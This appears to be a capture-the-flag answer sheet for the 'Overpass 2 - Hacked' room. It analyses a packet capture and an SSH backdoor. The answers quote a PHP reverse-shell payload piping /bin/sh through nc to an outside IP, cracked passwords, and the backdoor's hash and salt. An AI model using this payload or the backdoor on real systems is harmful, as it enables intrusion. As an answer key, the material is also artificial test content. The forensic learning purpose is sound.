# Overpass 2 - Hacked
Overpass has been hacked! Can you analyse the attacker's actions and hack back in?

## Task 1 - *Forensics - Analyse the PCAP*

What was the URL of the page they used to upload a reverse shell? \
**Mindset:** \
**Answer:** `/development/` \
**Explaination:**

What payload did the attacker use to gain access? \
**Mindset:** \
**Answer:** `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`\
**Explaination:**

What password did the attacker use to privesc? \
**Mindset:** \
**Answer:** `whenevernoteartinstant` \
**Explaination:**

How did the attacker establish persistence? \
**Mindset:** \
**Answer:** `https://github.com/NinjaJc01/ssh-backdoor` \
**Explaination:**

Using the fasttrack wordlist, how many of the system passwords were crackable? \
**Mindset:** \
**Answer:** `4` \
**Explaination:**

## Task 2 - *Research - Analyse the code*

What's the default hash for the backdoor? \
**Mindset:** \
**Answer:** `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` \
**Explaination:**

What's the hardcoded salt for the backdoor? \
**Mindset:** \
**Answer:** `1c362db832f3f864c8c2fe05f2002a05` \
**Explaination:**

What was the hash that the attacker used? - go back to the PCAP for this! \
**Mindset:** \
**Answer:** `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed` \
**Explaination:**

Crack the hash using rockyou and a cracking tool of your choice. What's the password? \
**Mindset:** \
**Answer:** `november16` \
**Explaination:**
